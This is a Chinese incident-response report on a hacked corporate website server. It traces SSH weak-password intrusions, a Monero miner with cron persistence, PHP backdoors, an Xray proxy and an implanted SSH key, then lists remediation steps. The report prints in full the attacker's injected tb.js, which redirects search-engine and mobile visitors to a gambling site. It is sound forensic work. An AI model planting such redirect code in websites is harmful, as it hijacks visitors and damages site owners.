  

## 0x01 事件背景

8月某日，客户官网被黑，需在特定时间内完成整改。为避免客户业务受到影响，实验室相关人员第一时间展开本次攻击事件的应急处理。

## 0x02 事件分析

网站源码被篡改，攻击者一定获取到了权限，那么接下来的思路就是推测攻击者入侵手段，找到业务脆弱点，对服务器进行全方位排查，找到攻击者留下来的痕迹并进行分析处理。

### 2.1 信息收集

与客户简单沟通后，得知如下基本信息：

  * 官网服务器为租赁的阿里云虚拟专用服务器

  * 虚拟专用服务器上部署的官网后台使用了DedeCMS织梦系统

  * 虚拟专用服务器安装了宝塔面板服务器运维系统

  * 虚拟专用服务器安装的宝塔面板的密码已被篡改

### 2.2 攻击入口判断

服务器开放了SSH、宝塔、DedeCMS等3个服务，那么接下来我们从服务器开放的服务来推测可能的攻击入口。

玩过宝塔的朋友都知道，宝塔后台路径未知的情况下，通过宝塔后台GetShell基本上是不可能的。此外，客户设置的BT面板的用户名也有些复杂，所以推断攻击者从宝塔下手的可能性很小（这里埋个坑，前面提到客户宝塔后台密码被修改的情况，后面会说到原因）。

客户官网使用的DedeCMS版本为 v5.7
sp2，尝试所有公开漏洞均未成功。并且，DedeCMS的后台密码没有规律，所以推测从DedeCMS入侵的可能性也不是很大。

客户给出了服务器的账号密码，我们的第一反应是入侵从SSH弱口令开始的。因为我的爆破字典里包含了服务器的密码（手动笑哭），但这显然还不能直接让客户信服。

![](https://image.3001.net/images/20220908/1662603952_631952b0aa84b56f4f1d6.png!small)

综上，高度怀疑服务器是被爆破SSH弱口令后导致了后续的入侵行为。

### 2.3 应急响应

在判断攻击入口后，我们登录客户的服务器，仔细抡了一遍，只能说服务器上的东西有点多。。。

  

 **2.3.1 BC黑页 &PHP后门**

首先访问客户首页，发现官网页面表面没有任何异常，也并未被重定向到BC网站。但是实际上网页Meta信息被篡改，且会异步请求BC网站和百度统计的若干接口。

![](https://image.3001.net/images/20220908/1662604126_6319535e83d98569a6a68.png!small)

  

推测攻击者的目的应为BC网站SEO优化，提高网站的SEO排名。

定位到服务器上的DedeCMS网站源码，发现源码在7月17日被修改植入了恶意代码。

![](https://image.3001.net/images/20220909/1662689857_631aa2416faffcb5017d4.png!small)

网站源码被插入2个新的meta元素，以及一段JavaScript代码。下图为新增的meta元素，解码后发现是菠菜搜索关键词。

![](https://image.3001.net/images/20220909/1662690190_631aa38eb2fdf85a3633e.png!small)![](https://image.3001.net/images/20220909/1662690391_631aa457b45345b291a4d.png!small)

新插入的JavaScript代码如下图所示。解码后发现是一段引用外部js的代码。

![](https://image.3001.net/images/20220909/1662690412_631aa46cd7a0ef70c4b5a.png!small)![](https://image.3001.net/images/20220909/1662690844_631aa61cd46ea0dd221e3.png!small)

恶意js文件的内容为：

![1662693667_631ab1231422125940ce2.png!small?1662693666820](https://image.3001.net/images/20220909/1662693667_631ab1231422125940ce2.png!small?1662693666820)

此文件的作用就是插入https://sjbgw2022.com/tb.js的恶意文件以及对恶意SEO优化。

继续查看tb.js这个文件内容：

    
    
    //这里省略一大段代码，因为代码内容与ly.js内容一致都是对恶意SEO的优化
    //上面的代码与之前一样作用就是推送自动收录。
    //JS正则表达式判断来路，如果是下列搜索引擎则指定跳转网址。
    var regexp=/\.(sogou|soso|baidu|bsb|youdao|lanjie|bing|118114|biso|sm|qq|so|safe|toutiao|biso|360)(\.[a-z0-9\-]+){1,2}\//ig;
    var where =document.referrer;
    if(regexp.test(where))
    {
    window.location.href="https://tb04.cc/";//满足就跳转至菠菜页面。
    }
    
    //更详细的检测，判断是否包含搜索引擎字段，是则跳转至菠菜页面。
     var sp_regexps =
      /\.(yahoo|google|baidu|soso|sogou|bing|sou|so|360|haosou|youdao|sooule|easou|aliyun|sina|jike|Yisou|uc|sm)\./gi;
    var sp_whereis = window.location.referrer;
    try {
      sp_whereis = top.document.referrer;
    } catch (e) {}
    try {
      sp_whereis = window.parent.document.referrer;
    } catch (e) {}
    var sp_domains = window.location.host;
    try {
      sp_domains = top.document.domain;
    } catch (e) {}
    try {
      sp_domains = window.parent.document.domain;
    } catch (e) {}
    if (sp_regexps.test(sp_whereis)) {
      window.location.href = 'https://tb04.cc';
      parent.window.opener.location = 'https://tb04.cc';
    }
    
    //判断是否是移动端，满足也跳转至菠菜页面。
    function browserRedirect() {
      var sUserAgent = navigator.userAgent.toLowerCase();
      var bIsIpad = sUserAgent.match(/ipad/i) == 'ipad';
      var bIsIphoneOs = sUserAgent.match(/iphone os/i) == 'iphone os';
      var bIsMidp = sUserAgent.match(/midp/i) == 'midp';
      var bIsUc7 = sUserAgent.match(/rv:1.2.3.4/i) == 'rv:1.2.3.4';
      var bIsAndroid = sUserAgent.match(/android/i) == 'android';
      var bIsCE = sUserAgent.match(/windows ce/i) == 'windows ce';
      var bIsWM = sUserAgent.match(/windows mobile/i) == 'windows mobile';
      if (!(bIsIphoneOs || bIsMidp || bIsAndroid || bIsCE || bIsWM)) {
      } else {
        window.location.href = 'https://tb04.cc';
      }
    }
    browserRedirect();

发现这个文件的作用是恶意SEO优化，判断访问网站的来路，如果是从搜索引擎过来的就会跳转至菠菜页面，如果是直接访问官网则不会有变化。菠菜页面截图如下所示：

![](https://image.3001.net/images/20220909/1662712454_631afa86c573d37278bf5.png!small)

此外，在DedeCMS源码目录发现了很多PHP后门。

![](https://image.3001.net/images/20220909/1662712471_631afa97879ab29a7dd7c.png!small)  
 **2.3.2 宝塔沦陷**

接下来我们进行了日志排查，发现系统日志都已经被清理。

![](https://image.3001.net/images/20220909/1662712486_631afaa67c8d9dd9220a7.png!small)

![](https://image.3001.net/images/20220909/1662712519_631afac79905ea7df6201.png!small)

前面说到宝塔密码已被修改，那么为了登入宝塔，我们直接修改宝塔密码。在服务器上输入bt命令进行修改。

![](https://image.3001.net/images/20220909/1662712600_631afb185a28e518d516f.png!small)

登入宝塔后台后，我们发现最后一次登录时间为7月16日，攻击者上传了一个名为zxc.php的木马文件。

![](https://image.3001.net/images/20220909/1662712640_631afb40653d784db528b.png!small)

网站日志未被删除，日志显示攻击者在7月17日通过zxc.php上传大量后门文件，下图为日志访问记录截图。

![](https://image.3001.net/images/20220909/1662712658_631afb52406498459783b.png!small)

下图为一个PHP大马的截图。

![](https://image.3001.net/images/20220909/1662713171_631afd5362161ce8603bd.png!small)

综上所述，推断攻击者是菠菜SEO黑产组织，攻击手法为利用SSH弱口令远程登录服务器，修改宝塔后台密码后上传木马，进而通过代理机器继续上传其它木马文件。这是2.2节中所述的宝塔密码被篡改的原因。

  

 **2.3.3 门罗币挖矿木马**

服务器上的问题还不仅仅是被挂黑页这么简单。服务器进程排查过程中发现，某进程CPU占用率特别高，不出意外就是挖矿程序了。

![](https://image.3001.net/images/20220909/1662713184_631afd60d7ce077a60402.png!small)

跟踪定位文件位置为/root/.warmup/。

![](https://image.3001.net/images/20220909/1662713197_631afd6d3f5e73e203ce3.png!small)

发现挖矿配置文件/root/.warmup/config.json。

![](https://image.3001.net/images/20220909/1662713226_631afd8aa1c5a32385dcb.png!small)

从网络通联信息发现矿池地址为5.133.65.53至5.133.65.56的IP段。威胁情报表明这是一个门罗币矿池。

![](https://image.3001.net/images/20220909/1662713241_631afd995cd1c1f64ba8d.jpg!small)![](https://image.3001.net/images/20220909/1662713261_631afdad635f6b92ffbfc.png!small)

杀死挖矿进程后程序自启动，删除挖矿文件后发现过一段时间文件会被重新下载并运行。这说明存在挖矿守护进程或定时任务。经分析，发现一个5月7日就创建的定时挖矿任务。

![](https://image.3001.net/images/20220909/1662713802_631affca4b928a138e6b9.jpg!small)![](https://image.3001.net/images/20220909/1662713836_631affec5166fd6e46dd0.jpg!small)

somescript文件内容为创建一个挖矿自启动服务warmup，保证进程或文件被删除后能重新加载挖矿程序。

![](https://image.3001.net/images/20220909/1662713864_631b0008351cd162ba76c.png!small)![](https://image.3001.net/images/20220909/1662713875_631b0013868a65d8c3199.png!small)![](https://image.3001.net/images/20220909/1662713895_631b002720babaa47506c.jpg!small)

 **2.3.4 xray代理**

Xray是V2ray的一个分支(Fork)。Xray项目基于V2ray而来，其支持并且兼容V2ray的配置，其官方网站为（https://xtls.github.io/Xray-docs-next/），我们在进程排查中发现有Xray程序正在运行。

![](https://image.3001.net/images/20220909/1662713915_631b003bb157fc9988ed8.png!small)

Xray最后一次运行时间为8月17日。

![](https://image.3001.net/images/20220909/1662713927_631b00478f65eaf6fd511.png!small)

 **2.3.5 SSH后门**

最后，除了后门、定时任务外，继续查看服务器上是否有攻击者留下的手段。我们发现服务器在5月9日被写入SSH公钥，经与客户确认不是客户所为。

![](https://image.3001.net/images/20220909/1662713940_631b00544130fde0e1aeb.png!small)

## 0x03 应急处理

客户有业务数据备份，那么处理和加固就简单多了。我们对服务器进行了如下操作：

  1. 重置系统服务器

  2. 修改服务器、系统后台的口令，加强口令复杂度，避免出现连续性口令

  3. 自定义日志目录，避免日志被删除

  4. 网站目录设置除root外所有用户禁止写入

  5. 上传目录做权限设置

## 0x04 事件还原与总结

我们推测攻击者不止一个，并且都是通过SSH弱口令入侵服务器。事件时间线如下图所示：

![](https://image.3001.net/images/20220909/1662688532_631a9d14b7f24edc2194e.jpg!small)

第一波攻击者可能是挖矿组织，在5月7日大概率利用SSH弱口令进入服务器上传挖矿程序somescript，且做了对应的维持手段。

第二波攻击者可能是黑产组织，攻击时间为7月16日至7月17日，其操作是对网站做黑帽SEO，更改宝塔后台并上传大量后门。

第三波攻击者应该只是想控制一批跳板机，在8月17日上传了代理程序，目前在服务器上出现的恶意事件最后截止也是到8月17日。

